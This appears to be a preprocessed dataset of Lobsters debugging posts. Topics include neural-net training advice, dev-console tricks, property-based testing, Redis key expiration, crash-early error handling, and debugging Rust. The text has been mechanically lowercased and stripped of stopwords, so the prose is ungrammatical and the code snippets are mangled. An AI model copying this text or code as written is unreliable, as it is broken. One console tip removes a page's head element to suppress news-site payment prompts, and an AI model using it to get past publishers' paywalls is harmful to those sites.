unfortunately much dire backprop sgd magically make network work batch norm magically make converge faster rnns magically let plug text formulate problem rl mean insist using technology without understanding work likely fail brings neural net training fails silently break misconfigure code often get kind exception plugged integer something expected string function expected argument import failed key exist number element two list equal addition often possible create unit test certain functionality start come training neural net everything could correct syntactically whole thing arranged properly really hard tell possible error surface large logical opposed syntactic tricky unit test example perhaps forgot flip label leftright flipped image data augmentation net still shockingly work pretty well network internally learn detect flipped image leftright flip prediction maybe autoregressive model accidentally take thing trying predict input due offbyone bug tried clip gradient instead clipped loss causing outlier example ignored training initialized weight pretrained checkpoint use original mean screwed setting regularization strength learning rate decay rate model size etc therefore misconfigured neural net throw exception lucky time train silently work bit worse result reeaally difficult overemphasize fast furious approach training neural network work lead suffering suffering perfectly natural part getting neural network work well mitigated thorough defensive paranoid obsessed visualization basically every possible thing quality experience correlate strongly success deep learning patience attention detail recipe light two fact developed specific process follow applying neural net new problem try describe see take two principle seriously particular build simple complex every step way make concrete hypothesis happen either validate experiment investigate find issue try prevent hard introduction lot unverified complexity bound introduce bugsmisconfigurations take forever find ever writing neural net code like training one want use small learning rate guess evaluate full test set every iteration become one data first step training neural net touch neural net code instead begin thoroughly inspecting data step critical like spend copious amount time measured unit hour scanning thousand example understanding distribution looking pattern luckily brain pretty good one time discovered data contained duplicate example another time found corrupted image label look data imbalance bias typically also pay attention process classifying data hint kind architecture eventually explore example local feature enough need global context much variation form take variation spurious could preprocessed spatial position matter want average pool much detail matter far could afford downsample image noisy label addition since neural net effectively compressedcompiled version dataset able look network mi prediction understand might coming network giving prediction seem consistent seen data something get qualitative sense also good idea write simple code searchfiltersort whatever think eg type label size annotation number annotation etc visualize distribution outlier along axis outlier especially almost always uncover bug data quality preprocessing set endtoend trainingevaluation skeleton get dumb baseline understand data reach super fancy multiscale aspp fpn resnet begin training awesome model sure road suffering next step set full training evaluation skeleton gain trust correctness via series experiment stage best pick simple model possibly screwed somehow eg linear classifier tiny convnet want train visualize loss metric eg accuracy model prediction perform series ablation experiment explicit hypothesis along way tip trick stage fix random seed always use fixed random seed guarantee run code twice get outcome remove factor variation help keep sane simplify make sure disable unnecessary fanciness example definitely turn data augmentation stage data augmentation regularization strategy may incorporate later another opportunity introduce dumb bug add significant digit eval plotting test loss run evaluation entire large test set plot test loss batch rely smoothing tensorboard pursuit correctness willing give time staying sane verify loss init verify loss start correct loss value eg initialize final layer correctly measure log softmax initialization default value derived regression huber loss etc init well initialize final layer weight correctly eg regressing value mean initialize final bias imbalanced dataset ratio positive negative set bias logits network predicts probability initialization setting correctly speed convergence eliminate hockey stick loss curve first iteration network basically learning bias human baseline monitor metric loss human interpretable checkable eg accuracy whenever possible evaluate human accuracy compare alternatively annotate test data twice example treat one annotation prediction second ground truth inputindepent baseline train inputindependent baseline eg easiest set input zero perform worse actually plug data without zeroing ie model learn extract information input overfit one batch overfit single batch example eg little two increase capacity model eg add layer filter verify reach lowest achievable loss eg zero also like visualize plot label prediction ensure end aligning perfectly reach minimum loss bug somewhere continue next stage verify decreasing training loss stage hopefully underfitting dataset working toy model try increase capacity bit training loss go visualize net unambiguously correct place visualize data immediately yhat model x sessrun tf want visualize exactly go network decoding raw tensor data label visualization source truth count number time saved revealed problem data preprocessing augmentation visualize prediction dynamic like visualize model prediction fixed test batch course training dynamic prediction move give incredibly good intuition training progress many time possible feel network struggle fit data wiggle much way revealing instability low high learning rate also easily noticeable amount jitter use backprop chart dependency deep learning code often contain complicated vectorized broadcasted operation relatively common bug come across time people get wrong eg use view instead transposepermute somewhere inadvertently mix information across batch dimension depressing fact network typically still train okay learn ignore data example one way debug related problem set loss something trivial like sum output example run backward pas way input ensure get nonzero gradient ith input strategy used eg ensure autoregressive model time depends generally gradient give information depends network useful debugging generalize special case bit general coding tip often seen people create bug bite chew writing relatively general functionality scratch like write specific function right get work generalize later making sure get result often applies vectorizing code almost always write fully loopy version first transform vectorized code one loop time overfit stage good understanding dataset full training evaluation pipeline working given model reproducibly compute metric trust also armed performance inputindependent baseline performance dumb baseline better beat rough sense performance human hope reach stage set iterating good model approach like take finding good model two stage first get model large enough overfit ie focus training loss regularize appropriately give training loss improve validation loss reason like two stage able reach low error rate model may indicate issue bug misconfiguration tip trick stage picking model reach good training loss want choose appropriate architecture data come choosing advice hero seen lot people eager get crazy creative stacking lego block neural net toolbox various exotic architecture make sense resist temptation strongly early stage project always advise people simply find related paper copy paste simplest architecture achieves good performance eg classifying image hero copy paste first run allowed something custom later beat adam safe early stage setting baseline like use adam learning rate experience adam much forgiving hyperparameters including bad learning rate convnets welltuned sgd almost always slightly outperform adam optimal learning rate region much narrow problemspecific note using rnns related sequence model common use adam initial stage project hero follow whatever related paper complexify one time multiple signal plug classifier would advise plug one one every time ensure get performance boost expect throw kitchen sink model start way building complexity eg try plug smaller image first make bigger later etc trust learning rate decay default repurposing code domain always careful learning rate decay would want use different decay schedule different problem even worse typical implementation schedule based current epoch number vary widely simply depending size dataset eg imagenet would decay epoch training imagenet almost certainly want careful code could secretely driving learning rate zero early allowing model converge work always disable learning rate decay entirely use constant lr tune way end regularize ideally place large model fitting least training set time regularize gain validation accuracy giving training accuracy tip trick get data first far best preferred way regularize model practical setting add real training data common mistake spend lot engineering cycle trying squeeze juice small dataset could instead collecting data far aware adding data pretty much guaranteed way monotonically improve performance wellconfigured neural network almost indefinitely would ensemble afford top model data augment next best thing real data halffake data try aggressive data augmentation creative augmentation halffake data fake data may also something people finding creative way expanding datasets example domain randomization use simulation clever hybrid inserting potentially simulated data scene even gans pretrain rarely ever hurt use pretrained network even enough data stick supervised learning get overexcited unsupervised pretraining unlike blog post tell far know version reported strong result modern computer vision though nlp seems pretty well bert friend day quite likely owing deliberate nature text higher signal noise ratio smaller input dimensionality remove feature may contain spurious signal added spurious input another opportunity overfit dataset small similarly lowlevel detail matter much try input smaller image smaller model size many case use domain knowledge constraint network decrease size example used trendy use fully connected layer top backbone imagenet since replaced simple average pooling eliminating ton parameter process decrease batch size due normalization inside batch norm smaller batch size somewhat correspond stronger regularization batch empirical meanstd approximate version full meanstd scale offset wiggle batch around drop add dropout use spatial dropout convnets use sparinglycarefully dropout seem play nice batch normalization weight decay increase weight decay penalty early stopping stop training based measured validation loss catch model overfit try larger model mention last early stopping found time past larger model course overfit much eventually early stopped performance often much better smaller model finally gain additional confidence network reasonable classifier like visualize network firstlayer weight ensure get nice edge make sense first layer filter look like noise something could similarly activation inside net sometimes display odd artifact hint problem tune loop dataset exploring wide model space architecture achieve low validation loss tip trick step random grid search simultaneously tuning multiple hyperparameters may sound tempting use grid search ensure coverage setting keep mind best use random search instead intuitively neural net often much sensitive parameter others limit parameter matter changing b effect rather sample throughly fixed point multiple time hyperparameter optimization large number fancy bayesian hyperparameter optimization toolbox around friend also reported success personal experience state art approach exploring nice wide space model hyperparameters use intern kidding squeeze juice find best type architecture hyperparameters still use trick squeeze last piece juice system ensemble model ensemble pretty much guaranteed way gain accuracy anything afford computation test time look distilling ensemble network using dark knowledge leave training often seen people tempted stop model training validation loss seems leveling experience network keep training unintuitively long time one time accidentally left model training winter break got back january sota state art conclusion make ingredient success deep understanding technology dataset problem set entire trainingevaluation infrastructure achieved high confidence accuracy explored increasingly complex model gaining performance improvement way predicted step way ready read lot paper try large number experiment get sota result good luck
206,Lobsters,debugging,Debugging,5 Tasks You Didn't Know Could be Done from the Developer Console,https://www.256kilobytes.com/content/show/10378/5-tasks-you-didnt-know-could-be-done-from-the-developer-console,task nt know could done developer console,html cs google sheet intro custom cs consolelog edit content webpage contenteditable property make content editable consoletable consoletable function consolegroup consolegroupend consolegroupcollaposed data extraction shorthand data extraction remove cs header honorable mention conclusion edit history april pm pdt august r garcia useragent spoofing spintax good keyboard virtual assitants pakistan link rel nofollow attribute proxy sin developer console literally every link building method via twitter,say one us ten percent piece software feature everyone us different ten percentsimilarly html cs well google sheet browser developer console number trick used probably know aboutintrofor new console debugging tool built various browser development tool crash course right click inspect elementfrom window opened find tab labeled console layout varies browserstype console press enter consolelog text congratulation hacker follow along rest articlecustom cs consolelog standard consolelog statement look like starting consolelog command c allows arbitrary cs injected second parameter done command consolelog c adsf color blue command also work space required consolelog cadsf color blue allows shit like consolelog cgood job opening console color brown fontweight bold edit content webpagesometimes edit webpage debugging purpose make fake screenshots fairly easily developer console contenteditable property used make content editable make even easier enter following line code developer console make entire page editable consoletable similarly consolelog consoletable function used display arbitrary data developer console function take array object json value used display table data example consoletable idaho texas maine display table keyvalue pair passed function json datasimilarly consolegroup consolegroupend consolegroupcollaposed used better organization debugging message output consoledata extractionfor example want extract url webpage use following command var documentqueryselectorall var output var iii iii tlength iii output iii iii getattribute href consoletable output want get slightly advanced use command get table innerhtml rel data well var documentqueryselectorall var output var iii iii tlength iii output iii href iii getattribute href rel iii getattribute rel innerhtml iii innerhtml consoletable output shorthand data extractionsince basically limitless possibility scrape console useful know shorthand queryselector queryselectorall method specifically remove cs headersthe head tag used include various helpful piece information used inject garbage website want remove stylesheets javascript header executing following command console documentheadparentnoderemovechild documenthead among thing used prevent fucking pls pay u per month read dtier propaganda message loading second initial pageload various news site tabloidshonorable mentionsin conclusioncongratulations know debugging trick know previously unless ignore continue use alert asdfjla feel free comment additional trick andor complaint muh safariusers downloaded ram huevos rancheros year ago univa year ago august r garcia year agoedit pdt august r garcia year ago pdt august r garcia year ago pdt august r garcia year ago pdt august r garcia year ago pdt august r garcia year ago posted april pm pdtaugust r garcialarping sysadmi portland orjoined december owneraugust garcia guy used sell viagra internet made website larp sysadmin posting garbage like useragent spoofing spintax good keyboard virtual assitants pakistan link rel nofollow attribute proxy sin developer console literally every link building method junkavailable arg via twitter open business inquiry based availability
207,Lobsters,debugging,Debugging,Property-Based Testing in a Screencast Editor: Video Scene Classification,https://wickstrom.tech/programming/2019/04/17/property-based-testing-in-a-screencast-editor-case-study-2.html,propertybased testing screencast editor video scene classification,last case study introduction first case study classifying scene imported video manually testing classifier video classification property testing still segment minimum length sidetrack generate output testing moving segment time span bug bug everywhere summary coming introduction timeline flattening video scene classification integration testing credit buy book ebook leanpub,last case study propertybased testing pbt komposition looked timeline flattening post cover video classifier tested bug found wrote property test read introduction first case study yet recommend checking classifying scene imported video komposition automatically classify scene importing video file central productivity feature application effectively cutting recorded screencast material automatically letting user focus arranging scene screencast scene segment considered moving opposed still segment still segment sequence least second nearequal frame moving segment sequence nonequal frame sequence nearequal frame duration le preconfigured minimum still segment duration komposition future might configurable user interface hardcoded equality two frame defined function e described informally comparing corresponding pixel color value small epsilon tolerance color variation deciding two frame equal least corresponding pixel pair considered equal addition rule stated two edge case first segment always considered moving segment even single frame last segment may still segment duration le second edge case would call desirable feature rather shortcoming due classifier type backtracking could changed future manually testing classifier first version video classifier property test instead wrote thought decent classifier algorithm mostly messing around various pixel buffer representation parallel processing achieve acceptable performance type testing available except general use application colortinting utility separate program using classifier algorithm took input video file produced output video file frame tinted green red moving still frame respectively video classification shown color tinting recording see colortinted output video based recent version classifier classifies moving still segment rather accurately wrote property test fixed bug found look pretty flipping back forth seemingly random place first debugging classifier colortinting tool way seemed like creative powerful technique feedback loop horrible record video process using slow colortinting program inspecting eye hindsight conclude pbt far effective testing classifier video classification property figuring write property test video classification obvious uncommon examplebased testing test end mirroring structure even full implementation complexity system test happen propertybased testing complex system hard describe correctness relation valid input observed output video classifier one case decide output classification correct specific input without reimplementing classification test way around easy though classification convert video frame thus solution testing problem generate input instead generate expected output hillel wayne call technique recent article classifier property test generate highlevel representation expected classification output list value describing type duration segment generated sequence expected classified segment next list output segment converted sequence actual frame frame twodimensional array rgb pixel value conversion simple moving segment converted sequence alternating frame flipping gray white pixel still frame converted sequence frame containing black pixel example sequence diagram converted pixel frame frame rate fps visualized like following diagram thin rectangle represents frame pixel frame derived sequence expected classified output segment generating highlevel output converting pixel frame input feed classifier know output produce writing effective property test come writing generator produce valid output according specification classifier post show two property test testing still segment minimum length stated beginning post classified still segment must duration greater equal minimum still segment duration used parameter classifier first property test look asserts invariant hold classification output hpropclassifiesstillsegmentsofminlength property generate minimum still segment lengthduration minstillsegmentframes forall genint rangelinear framerate let minstillsegmenttime framecountduration minstillsegmentframes generate output segment segment forall gensegments rangelinear rangelinear minstillsegmentframes rangelinear minstillsegmentframes minstillsegmentframes resolution convert test segment actual pixel frame let pixelframes testsegmentstopixelframes segment run classifier pixel frame let counted classifymovement minstillsegmenttime pipeseach pixelframes pipestolist countsegments sanity check counttestsegmentframes segment totalclassifiedframes counted ignore last segment verify segment case initmay counted rest traverse assertstilllengthatleast minstillsegmenttime rest nothing success resolution chunk test code pretty busy using helper function going bore high level test generates minimum still segment duration based minimum frame count call n range classifier currently requires n geq hence lower bound upper bound frame arbitrary number chosen generates valid output segment using custom generator gensegments moving segment frame count still segment frame count n convert generated output segment actual pixel frame done using helper function return list alternating gray white frame black frame described earlier count number consecutive frame within segment producing list like moving still moving still performs sanity check number frame generated expected output equal number frame classified output classifier must lose duplicate frame drop last classified segment according specification frame count le n asserts still segment frame count greater equal n run test hpropclassifiesstillsegmentsofminlength hedgehogwithtests hedgehogcheck interactive passed test cool look like working sidetrack generate output might wonder generate output segment first convert pixel frame generate random pixel frame begin property test check still segment long enough benefit generating valid output becomes clearer next property test use expected output classifier converting output sequence pixel frame easy state complex relation input output property using oracle generator assertion often plain equality check generated actual output benefit using oracle generator still segment property even subtle generating valid output converting pixel frame generate input cover edge case system test using property test statistic coverage check could inspect coverage even fail test run generator hit enough case interested generated random sequence pixel frame perhaps majority generated example would produce moving segment could tweak generator get closer either moving still frame within distribution variation generating valid scene would worse fact reusing existing generator highlevel representation could easily convert compare assertion testing moving segment time span second property state classified moving segment must start end timestamps moving segment generated output compared previous property relation generated output actual classified output stronger hpropclassifiessamescenesasinput property generate minimum still still segment duration minstillsegmentframes forall genint rangelinear framerate let minstillsegmenttime framecountduration minstillsegmentframes generate test segment segment forall gensegments rangelinear rangelinear minstillsegmentframes rangelinear minstillsegmentframes minstillsegmentframes resolution convert test segment actual pixel frame let pixelframes testsegmentstopixelframes segment convert expected output segment list expected time span full duration let duration map segmentwithduration segment expectedsegments movingscenetimespans duration fullduration foldmap unwrapsegment duration classify movement frame let classifiedframes pipeseach pixelframes classifymovement minstillsegmenttime pipestolist classify moving scene time span let classified pipeseach classifiedframes classifymovingscenes fullduration pipesdrain pipesruneffect runidentity check classified time span equivalence expectedsegments classified resolution step previous property test test convert generated output segment list time span time span mark start end expected moving segment furthermore need full duration input step computed classify movement frame ieâ part moving still segment run second classifier function called classifymovingscenes based full duration frame classified movement data resulting list time span compare expected actual classified list time span test look somewhat complicated setup various conversion core idea simple effective bug bug everywhere preparing talk propertybased testing added segment time property week event time used komposition edit multiple screencasts surely significant bug caught already adding property test confirm level quality application already right nope first discovered existing test fundamentally incorrect begin reflecting specification mind one described beginning post furthermore found generator error first used hedgehog generate pixel used classifier input moving frame based majority randomly colored pixel small percentage equally colored pixel still frame based random single color problem anticipated color used moving frame guaranteed distinct color used still frame smallsized example got black frame beginning end moving segment black frame still segment resulting different classified output expected hedgehog shrinking failing color towards black highlighted problem even made generator much simpler using alternating whitegray frame approach described earlier went running new shiny test got come classified time span generated output single moving scene frame second fps started digging using annotate function hedgehog inspect generated intermediate value failing example find anything incorrect generated data shifted focus implementation code end timestamp consistently showing failing example looking code found curious hardcoded value bound used locally classifymovement function essentially fold stream frame accumulator hold vector previously seen notyetclassified frame stripping simplifying old code highlight one bug looked something like classifymovement minstillsegmenttime case instillstate somediff minequaltimeforstill else inmovingstate someotherdiff minstillsegmenttime else minequaltimeforstill look going instillstate branch us value minequaltimeforstill instead always using minstillsegmenttime argument likely residue refactoring meant make value parameter instead hardcoded definition sparing gory implementation detail outline two problem found addition using hardcoded value incorrectly classified frame based value frame classified ended get output see given hardcoded value well also offbyone bug one frame classified incorrectly together accumulated moving frame classifymovement function line haskell code juggling state managed mess three separate way time test place quickly found bug fixed ran thousand test passing finally ran application imported previously recorded video edited short screencast classified moving segment notably better summary simple streaming fold hide bug hard detect manual testing consistent result together hardcoded value frame rate fps pointed clearly towards offbyone bug consider great showcase powerful shrinking pbt consistently presenting minimal example point towards specific problem party trick ideal mathematical function could error caught without pbt think effort would require manual testing introspection work code review might revealed incorrect definition minequaltimeforstill perhaps offbyone incorrect state handling bug course many qa technique evaluate given low effort pbt requires setting amount problem find accuracy provides troubleshooting think clear win also want highlight iterative process find naturally emerges applying pbt think system supposed work write specification think generate input data test system based specification tune generator provide better test data try alternative style property perhaps modelbased metamorphic testing fit system better run test analyze minimal failing example fix implementation test pas done modifying existing code writing new code apply without implementation code yet perhaps minimal stub workflow essentially tdd coming final post series cover testing higher level system effect multiple subsystem integrated form full application look property test found many bug made substantial refactoring possible introduction timeline flattening video scene classification integration testing thanks reading credit thank ulrik sandberg pontus nagy fredrik reviewing draft post buy book series available ebook leanpub content mostly change bringing uptodate also already enjoyed article might want support work purchasing book finally might enjoy nicely typeset pdf epub book web page
208,Lobsters,debugging,Debugging,Improving Key Expiration in Redis,https://blog.twitter.com/engineering/en_us/topics/infrastructure/2019/improving-key-expiration-in-redis.html,improving key expiration redis,infrastructure improving key expiration redis redis documentation,infrastructure improving key expiration redis recently interesting issue ran performance issue redis cluster lot time spent debugging testing able reduce memory use cluster change key expiration internally twitter run multiple cache service one backed redis redis cluster store data important use case impression engagement data ad spend counting direct message background info problem back early cache team large update architecture redis cluster thing changed among update redis version version update couple issue came user started see memory use align expected provisioned use latency increase key eviction key eviction big problem data removed expected persistent traffic going origin data store originally initial investigation team affected along cache team started investigate found latency increase related key eviction happening redis receives write request memory save write stop evict key save new key still needed find increase memory usage happening causing new eviction suspected memory full key expired deleted yet one idea someone suggested use scan would read key causing expired one deleted redis two way key expired actively passively scan would trigger passive key expiration key read ttl checked expired throw away return nothing active key expiration version described redis documentation start function called activeexpirecycle run internal timer redis refers cron run several time second function cycle keyspace check random key ttl set percentage threshold â met expired key repeat process time limit met idea scanning key worked memory use dropped scan completed seemed redis efficiently expiring key unfortunately resolution time increase size cluster hardware key would spread around would memory available disappointing project upgrade redis mentioned earlier reduced size cost running cluster making efficient redis version changed version implementation activeexpirecycle changed every database checked time ran maximum many database checked version also introduced fast option function run timer run checking event event loop fast expiration cycle return early certain condition also lower threshold function timeout exit time limit also checked frequently overall line code added function returning investigation recently time go back revisit memory use issue wanted explore regression see could make key expiration better first theory many key instance redis sampling enough thing wanted investigate impact database limit introduced scale way sharding handled make running redis twitter unique large keyspaces million key typical user redis shard represented keyspace instance redis multiple shard instance redis lot keyspaces sharding combined scale twitter create dense backends lot key database testing improvement expiration number sampled loop configured variable activeexpirecyclelookupsperloop decided test three value ran one problematic cluster ran scan measured difference memory use large change indicates sizeable amount expired data waiting collected test positive result initially memory use test control three test instance sampled key number arbitrary value based output â statistical samplesize calculator total key population size chart even looking starting number test instance clear performed better percentage difference running scan show around overhead expired key although sampling key helped find expired key negative latency effect could tolerate graph show percentile latency millisecond show latency correlated increase key sampled orange use value green used blue used control yellow line match color table seeing latency affected sample size idea see sample size could adjusted automatically based many key expire would key expire latency would take hit work would scan le key perform faster idea mostly worked able see memory use lower latency affected metric tracking sample size showed increasing decreasing time however go solution introduced latency spike occur control instance code also kind convoluted hard explain intuitive also would adjust cluster ideal would like avoid adding operational complexity investigating regression version also wanted investigate changed redis version new version introduced variable called crondbspercall set max number database would checked run cron test impact simply commented line â dbspercall serverdbnum timelimitexit dbspercall serverdbnum would compare effect limit checking database run result benchmark excitingly positive test instance one database though logically line code made difference modified unmodified version variable always set started look one line commented made drastic difference since statement first thing suspected branch prediction took advantage builtinexpect change code compiled make difference performance next looked assembly generated see exactly going statement compiled important instruction mov cmp jg mov load memory register cmp compare two register set another based result jg conditional jump based value another register code jumped code block else â took statement put compiled assembly redis tested effect instruction commenting different line tested mov instruction see kind performance issue loading memory cpu cache issue difference tested cmp instruction difference ran test jg instruction included latency went back unmodified level finding tested whether jump specific jg instruction added non conditional jump instruction jmp jump jump back code running performance hit spent time looking different perf metric tried custom metric listed manual nothing conclusive one instruction caused performance issue theory related instruction cache buffer cpu behavior jump executed ran time decided come back future possibly resolution needed pick solution problem better understanding cause problem decision go simple modification able configure steady sample size startup option able find value good trade latency memory use even though removing statement caused drastic improvement uncomfortable making change without able explain better graph memory use first cluster deployed top line pink hidden behind orange median memory use cluster top line orange control instance middle part chart canary new change third part show control instance restarted compare canary memory use quickly increased control restarting patch contains new option seen pretty big investigation end included engineer multiple team reduction cluster size pretty nice result learned lot would like take another look code see optimization make help team focused performance tuning seems like potentially still lot gain engineer made big contribution investigation mike barry rashmi ramesh bart robinson
209,Lobsters,debugging,Debugging,Crash early and crash often for more reliable software,https://medium.com/@mattklein123/crash-early-and-crash-often-for-more-reliable-software-597738dd21c5,crash early crash often reliable software,crash early crash often reliable software code liability assert early assert often using code coverage style guideline limit error handling complexity envoy error handling guideline ownership semantics used prevent crash lead complexity bug conclusion,crash early crash often reliable softwarei increasingly noticed disturbing trend software engineering idea total program crash via segmentation fault panic null pointer exception assertion etc indication piece software poorly written trustedalthough true case crash may indication unreliable software subpar development method crashing also valid error handling method used correctly increase rather decrease overall quality reliability velocity piece softwarecode liabilityultimately every line code program liability may lead software defect one particularly pernicious source code defect volume rarely never used error handling codedef dosomethingwithbar bar bar none ever actually happen return false bardosomething return truein previous example show python check see bar null value something indicate failure bar null function return boolean value committee functional programming purity come instead checking null assume bar optional check whether value idea applies example may seem contrived see pattern frequently code review review comment always ever actually happen sometimes happen often engineer written code style mistaken belief code must error checkingthe error checking program need error actually happen normal control flowif previous example bar never null dosomethingwithbar removed code entirely dosomething method call inlined additionally caller function longer need deal cognitive load understanding whether need handle error call dosomethingwithbar last point critical even though example contrived something like frequently found real codebases long call chain additional needle error handling quickly become impossible reason code logic extraneous call chain logic make larger codebase harder reason harder maintain enhance likely contain bugswhat author code wrong bar fact null let program crash resulting crash stack trace extremely obvious easy debug fix may become clear invariant bar always null true may also become clear caller dosomething broken proper bar either way code stay simple possible without extraneous logic hard reason aboutassert early assert oftena corollary crash early crash often assert early assert often asserts tremendously powerful mechanism verify code invariant thing always true favor two type asserts debug asserts asserts compiled release build well truly never happenrelease asserts asserts compiled release build used check situation may theoretically happen would preferable crash restart instead trying handle errordebug assertion outnumber release assertion large factori view assertion incredibly powerful tool reducing code complexity following reason assertion act documentation reader clearly understands state program expected assertion runsassertions definition limit extraneous branch error handling handle state never happen language contain builtin assertion eg go recommend creating simple assertion wrapper crash program satisfiedwhat happens programmer incorrect assertion valid case let program crash like null check previous section assertion failure trivial debug fix may either remove assertion add handling code make calling code adhere assertionusing code coverage style guideline limit error handling complexityalthough code coverage imperfect tool high coverage percentage necessarily mean program quality test coverage enforcing high level coverage useful yielding liberal use assertion limiting error handling necessaryin envoy error handling guideline write tip thought adding extra test coverage logging stats handle error continue seems ridiculous never happen good indication appropriate behavior terminate process handle error doubt please discussin essence force error branch assertion covered test programmer feel time wasteful useful forcing function code logic simplificationownership semantics used prevent crash lead complexity bugsone area often see extra complexity bug added order ostensibly prevent crashing objectdata ownership semantics fundamentally three different way data allocated tracked program stackheap single owner eg std uniqueptr c standard borrow checking rust etc note many popular language ownership type available practice heap allocated object referencecounted allow possible unintentional sharing eg java python j go etc heap multiple owner eg std sharedptr c java go python rust shared pointer etc stack allocation relatively simple easy understand going primarily discus relate crashing early code complexityat high level code us heap data single owner substantially easier reason code us referencecounted data single piece code allocates data single piece code free simple alternative shared ownership use shared ownership make code extremely difficult reason object freed memory leak due circular reference somewhat ironically seen many production memory leak software written java python due circular shared reference v well written c make heavy use single owner semantics downside single ownership approach ease creating use free situation cc rust avoids use free entirely borrow checker still allowing single owner semantics incredibly powerful correctness perspective well single data owner perspective look forward day code written language rustlike semantics said given majority code world still written cc java python j similar language continue discussion viewpointin cc use free crash sometimes difficult debug making rust borrow semantics enticing productivity standpoint clearly sign program crashed invariant violated alternative sometimes see tried cc favoring javapythonlike shared object ownership effort avoid type crash thinking go object never freed reference program never crash yet experience inevitably lead greater code complexity bug due circular reference hard reason logic etconly use shared memory ownership program logic actually call itfor reason advocate limited error handling extra assertion using single owner semantics preferred rust compiler verify correctness cc compiler letting program crash fixing uncovered invariant violation far preferable introducing needle ownership code complexity attempt avoid crash type altogetherfor language allow explicit single owner semantics recommend aggressively setting reference null longer use reduces chance circular reference make effective use free issue clearconclusionlimiting software complexity one primary mechanism available u limit defect often invariant violation cause fatal crash substantially easier debug fix complex code attempted prevent crash first place specifically recommend using following three technique limiting error handling code complexity limit error handling error actually happen normal control flow crash otherwiseliberally use assertion document invariant state crash violateduse single owner data semantics possible limit code complexity using cc let program crash ownership invariant violatedthe three strategy limit code complexity generally yield bug obvious easier fix
211,Lobsters,debugging,Debugging,Dev console trick: selector helpers,https://gomakethings.com/dev-console-trick-selector-helpers/,dev console trick selector helper,dev console trick selector helper laurence hughes remy sharp live stream like,dev console trick selector helper yesterday laurence hughes let know awesome dev console trick learned remy sharp live stream use shorthand queryselector shorthand queryselectorall even better return array instead nodelist use array method returned result get first element var get element var look like underthehood var function selector return documentqueryselector selector var function selector return arrayfrom documentqueryselectorall selector would use production code great quickly testing stuff live ui tested latest version chrome firefox safari worked three access ie edge right test like send short email weekday code snippet tool technique interesting stuff around web join daily subscriber
212,Lobsters,debugging,Debugging,Show some love to Node.js process errors,https://github.com/ehmicky/log-process-errors,show love nodejs process error,medium article use case logging debugging testing demo install usage cli flag option log full documentation level full documentation exiton full documentation testing full documentation color full documentation support submit issue github chat u gitter code conduct contributing guideline,medium article show nodejs process error nodejs print process error uncaughtexception warning unhandledrejection rejectionhandled console useful unfortunately error logprocesserrors fix issue without logprocesserrors logprocesserrors use case proper logging process error production debugging process error development automated testing process error demo try library install production code eg server install either production development dependency npm install logprocesserrors however library install development dependency npm install logprocesserrors logging modified globally library user might expect sideeffect also might lead conflict library usage two way load library first use node r cli flag node r logprocesserrorsbuildregister second const logprocesserrors require logprocesserrors logprocesserrors option logprocesserrors called early possible code requireimport statement option option optional object following property log type function error level originalerror customizes process error logged full documentation level type object default warning warn multipleresolves info default error log level use full documentation exiton type string default uncaughtexception process error trigger processexit full documentation testing type string value ava mocha jasmine tape nodetap default undefined running test make fail process error full documentation color type boolean default true output terminal colorizes message full documentation support found bug would like new feature nt hesitate submit issue github question feel free chat u gitter everyone welcome regardless personal background enforce code conduct order promote positive inclusive environment contributing project made simplest way give back starring sharing online documentation unclear typo please click page edit button pencil icon suggest correction would like help u fix bug add new feature please check guideline pull request welcome thanks go wonderful contributor
214,Lobsters,debugging,Debugging,How to Debug Rust with Visual Studio Code,https://www.forrestthewoods.com/blog/how-to-debug-rust-with-visual-studio-code/,debug rust visual studio code,install rust install visual studio code cc window codelldb o x linux rust extension natvis microprofile vscoderustexamplezip,visual studio code rust editor choice unfortunately ca nt quite debug rust box configuring debugger nt hard step gone several time writing guide save future remember hopefully guide useful folk well go without saying install rust install visual studio code need install extension one depends platform cc window codelldb o x linux probably make sense go ahead install rust extension well tool installed need configure v code launch property click debug add configuration window select c window mac linux select lldb custom launch create open launchjson manually change executable name program version configuration name window launch type cppvsdbg request launch program workspaceroot targetdebugfooexe args stopatentry false cwd workspaceroot environment externalconsole true name osx launch type lldb request launch program workspaceroot targetdebugfoo args cwd workspaceroot text copypasta next verify breakpoints enabled reader reporting needing machine enabled default file preference setting add breakpoint press launch voila debugging rust work pretty well perfect pretty good basic type work fine assuming nt optimized away compiler course found rust compiler little aggressive c come optimizing away unused variable sometimes store intermediate value variable debugger absence mildly annoying vector work fine thankfully wish unexpanded preview informative unfortunately container nt work hashmap indecipherable crap visual studio natvis c great lot complaint way better rust nothing working post learned something new somewhat blown away want share experimenting microprofile library nt behaving quite like expected stepped debugger much surprise able seamlessly step crate rust code really shocked could also step right underlying c code work additional configuration needed nt manuall specify include path awesome easily stepinto crate dependency crate relies c code debug idea easy delightful surprise put together small sample project launchjson preconfigured work run cargo build open vscodewscodeworkspace add breakpoint select debug launch config press download vscoderustexamplezip love debugger using v code debug rust nt perfect pretty good guide everything need get started work platform however tested window o x missing step process change please let know thanks reading
215,Lobsters,debugging,Debugging,"Documenting your architecture: Wireshark, PlantUML and a REPL to glue them all",https://danlebrero.com/2017/04/06/documenting-your-architecture-wireshark-plantuml-and-a-repl/,documenting architecture wireshark plantuml repl glue,tool wireshark export json plantuml clojure repl result singlepage application openid connect usermanaged access benefit drawback benefit,instead drawing uml diagram generate network traffic capture running system recently document result evaluation new systemthe proof concept system included six possible configuration option significant architectural impact systemto understand six squinting log server plus chrome devtools network panel trying correlate request response traffic serversas part documentation thought would important sequence diagram explain protocol different part systembut trying draw sequence diagram realized squinting allowed grasp general feeling difference option enough write proper accurate description onealso prospective boredom opening least hated uml tool spending hour dragging dropping box fiddling around line fill joygiven already six combination running proof concept leverage toolsfirst need find traffic component system use venerable wireshark wireshark allow u capture network traffic filtering anything unnecessary plus come handy export json feature simplify parsing outputa snippet http request look like second need generate uml diagram use plantuml text based uml dsl accompanying library generate image text based problem generating uml diagram becomes one string concatenationlastly need glue transform wireshark json file plantuml text file use clojure turing complete language would course clojure repl make task pleasantthe resultfirst show let look one diagram look like diagram requires line plantuml look like browser backend browser backend json browser backend apilibrary browser backend json note browser nginx note browser backend whole plantuml code code found hereif curious diagram corresponds loading singlepage application authentication openid connect authorizing api endpoint usermanaged accessbenefitsthe benefit using three tool able generate set diagram accurate giving confidence missing anything assuming bug parsing code set diagram generated using code look consistent data contain look feel data diagram code generate text mean version control manually inspected tweaked required decide change detail diagram take time update diagram maybe code generate diagram used project diagram desired level detail example diagram removed loading image cs javascript file add great deal detail diagram data capture even requestresponse could parse extract information relevant system favourite ide interactive fashion videodrawbacksof course drawback system working able sniff traffic data capture huge prefiltering capture phase maybe necessary 